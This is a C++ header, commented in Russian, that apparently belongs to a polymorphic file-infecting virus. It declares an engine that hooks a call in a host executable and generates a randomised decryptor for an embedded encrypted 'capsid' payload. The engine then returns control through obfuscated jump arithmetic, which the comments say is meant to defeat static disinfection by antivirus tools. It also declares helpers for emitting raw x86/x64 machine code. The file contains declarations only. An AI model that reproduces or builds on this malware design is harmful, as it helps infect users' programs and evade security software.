#pragma once
#include "global.hpp"
#include "EncryptionAlgo.hpp"
#include "dna.hpp"

// интерфейс движка, который генерирует стартап код
class ICodegenEngine
{
public:
	virtual ~ICodegenEngine() = default;
	
	// инициализация движка необходимыми ему для работы данными
	// capsid - указатель на плейнтекст оригинального капсида который был записан
	// capsidEntryRVA - RVA записанного блоба капсида в файле
	// dwOriginalCallRVA - RVA оригинальной инструкции на которую совершался переход до перехвата вызова, туда нужно сделать безусловный переход
	// dwCodePlaceRVA - RVA в памяти куда будет замаплен генерируемый стартовый код, требуется чтобы корректно расчитать RVA блоков в стартап коде
	// dwArch - архитектура генерируемого кода
	virtual BOOL init(capsid_metadata *capsid, DWORD32 capsidEntryRVA, DWORD32 dwOriginalCallRVA, DWORD32 dwCodePlaceRVA, DWORD dwArch, DWORD dwCodegenSeed, IDNAProcessor *dna) = 0;
	// генерирует код, lpOutBuffer - буфер содержащий сгенерированный байткод
	// dwOutSize - размер буфера, освобождается после деструктора инстанса само
	// pdwOepReturnRVA - RVA в памяти куда записать переход на оригинальную функцию в восстанавливающем коде
	virtual BOOL gen(LPBYTE *lpOutBuffer, SIZE_T *dwOutSize, PDWORD32 pdwOepReturnRVA) = 0;

	virtual IEncgen *get_encryption() = 0;
	// нужно чтобы не переинициализировать каждый раз алгоритм генерации, иначе это может снизить энтропию полиморфизма
	virtual long *get_holdrand_pointer() = 0;

protected:
	// результаты работы
	LPBYTE lpResult;
	SIZE_T dwResultSize;
	IEncgen *encryption;
	long holdrand;
};

// базовый полиморфный двиг, генерирует стартап код каждый раз случайным
// генерирует случайный алгоритм шифрования для шифрования капсида
// генерирует случайный декриптор и совершает переход на entry капсида, RVA ентри читается заранее из метаданных записанного капсида, а НЕ парсится сразу там
// <deprecated>после возврата из загрузчика капсида патчит стартап код так, что каждый последующий вызов на него перейдет сразу к восстановлению управления
// это нужно чтобы избежать множественных попыток расшифровать в многопоточной среде</deprecated>
// в самом конце совершает безусловный косвенный переход *случайным* образом высчитываемый абсолютный адрес (x86) или относительный RIP'у (x64) оригинальной инструкции
// куда предназначался вызов. У нас уже есть RVA, а значит можем его разбить на случайные арифметические инструкции. Это затруднит статическое лечение файлов потребуя
// использование эмуляторов
class BasicPolymorphicEngine : protected ICodegenEngine
{
public:
	BasicPolymorphicEngine();
	~BasicPolymorphicEngine();

	BOOL init(capsid_metadata *capsid, DWORD32 capsidEntryRVA, DWORD32 dwOriginalCallRVA, DWORD32 dwCodePlaceRVA, DWORD dwArch, DWORD dwCodegenSeed, IDNAProcessor *dna);
	// pdwOepReturnRVA - RVA куда записывать будем в восстановлении переход на оригинальную функцию
	BOOL gen(LPBYTE *lpOutBuffer, SIZE_T *dwOutSize, PDWORD32 pdwOepReturnRVA);

	IEncgen *get_encryption();
	long *get_holdrand_pointer();
protected:
	capsid_metadata *_capsid;
	DWORD32 _capsidEntryRVA;
	DWORD32 _dwOriginalCallRVA;
	DWORD32 _dwCodePlaceRVA;
	DWORD _dwArch;
	IDNAProcessor *dnaCode;

private:
	// --------------- генераторы ----------------
	// каждая подпроцедура генератора возвращает дельту начала сгенерированного ею кода
	// код записываетя линейно в lpResult
	// инкрементируя общий занятый размер
	// генерирует пролог стартап кода: сохранение регистров
	SIZE_T generate_prologue();
	// генерирует код стартующий лоадер капсида: декриптор капсида и передачу управления
	SIZE_T generate_loader_starter();

	// генерирует эпилог стартап кода: восстановление регистров
	SIZE_T generate_epilogue();
	// генерирует код восстановления исполнения, передавая управление на оригинальный вызываемый адрес
	SIZE_T generate_restoration_code();
	// генерирует завершающий код после стартапа, если возвращает 0, то ничего не было сгенерировано и дописывать ничего не требуется
	DWORD generate_endcode(LPBYTE lpOutputBuffer, SIZE_T dwBufferSize, DWORD dwArch);

	DWORD dwTrashSize;
};

namespace assembler
{
	// некоторые разбиты на конкретные архитектуры, некоторые же (в основном передача управления) находятся в общей, так как кодируются одинаково
	
	void call_rel32(DWORD dwRel32, LPBYTE lpBuffer, PSIZE_T dwIndex);
	void jmp_rel32(DWORD dwRel32, LPBYTE lpBuffer, PSIZE_T dwIndex);
	void jmp_register(UINT reg_offset, LPBYTE lpBuffer, PSIZE_T dwIndex);
	void ret(LPBYTE lpBuffer, PSIZE_T dwIndex);

	// зацикливает исполнение пока в регистре не будет определенного значения
	// reg_offset - регистр
	// checkamount - cmp r, checkamount
	// dwDeltaLabel - RVA метки на которую делать переход 
	void loop_until_reached(UINT reg_offset, UINT checkamount, DWORD dwDeltaLabel, LPBYTE lpBuffer, PSIZE_T dwIndex, DWORD dwArch, long holdrand);
	// обнуляет регистр
	void register_tereshkova_setzero(UINT reg_offset, LPBYTE lpBuffer, PSIZE_T dwIndex, DWORD dwArch, long holdrand);
	void add_reg_imm32(UINT reg_offset, DWORD dwValue, LPBYTE lpBuffer, PSIZE_T dwIndex, DWORD dwArch);
	namespace x86
	{
		enum GENERAL_REGISTERS_T
		{
			EAX = 0,
			ECX,
			EDX,
			EBX,
			ESP,
			EBP,
			ESI,
			EDI
		};
		// далее идут команды
		// lpBuffer - начало буфера куда записывать команды
		// dwIndex - указатель на офсет для записи от начала буфера
		void push_r32(GENERAL_REGISTERS_T reg_offset, LPBYTE lpBuffer, PSIZE_T dwIndex);
		void pop_r32(GENERAL_REGISTERS_T reg_offset, LPBYTE lpBuffer, PSIZE_T dwIndex);
		void mov_imm32_to_reg32(GENERAL_REGISTERS_T reg_offset, DWORD imm32, LPBYTE lpBuffer, PSIZE_T dwIndex);
		// sub r32, imm32
		void sub_r32_imm32(GENERAL_REGISTERS_T reg_offset, DWORD imm32, LPBYTE lpBuffer, PSIZE_T dwIndex);
		// сохраняет EIP в reg через E8 00 00 00 00 / pop r32 
		void save_eip_to_reg(GENERAL_REGISTERS_T reg_offset, LPBYTE lpBuffer, PSIZE_T dwIndex);
		
	}

	namespace x64
	{
		enum GENERAL_REGISTERS_T
		{
			RAX = 0,
			RCX,
			RDX,
			RBX,
			RSP,
			RBP,
			RSI,
			RDI
		};

		enum ADDITIONAL_REGISTERS_T
		{
			r8 = 0,
			r9,
			r10,
			r11,
			r12,
			r13,
			r14,
			r15
		};


		// push r64 из общих регистров
		void push_general_r64(GENERAL_REGISTERS_T reg_offset, LPBYTE lpBuffer, PSIZE_T dwIndex);
		// push r64 из дополнительных rx
		void push_additional_r64(ADDITIONAL_REGISTERS_T reg_offset, LPBYTE lpBuffer, PSIZE_T dwIndex);

		void pop_general_r64(GENERAL_REGISTERS_T reg_offset, LPBYTE lpBuffer, PSIZE_T dwIndex);
		void pop_additional_r64(ADDITIONAL_REGISTERS_T reg_offset, LPBYTE lpBuffer, PSIZE_T dwIndex);
		void mov_imm32_to_reg64(GENERAL_REGISTERS_T reg_offset, DWORD imm32, LPBYTE lpBuffer, PSIZE_T dwIndex);
		void mov_imm64_to_reg64(GENERAL_REGISTERS_T reg_offset, DWORD64 imm32, LPBYTE lpBuffer, PSIZE_T dwIndex);
		void lea_reg64_rel32(GENERAL_REGISTERS_T reg_offset, DWORD rel32, LPBYTE lpBuffer, PSIZE_T dwIndex);
		// сохраняет RIP в регистр
		void save_rip_to_reg(GENERAL_REGISTERS_T reg_offset, LPBYTE lpBuffer, PSIZE_T dwIndex);

	}
}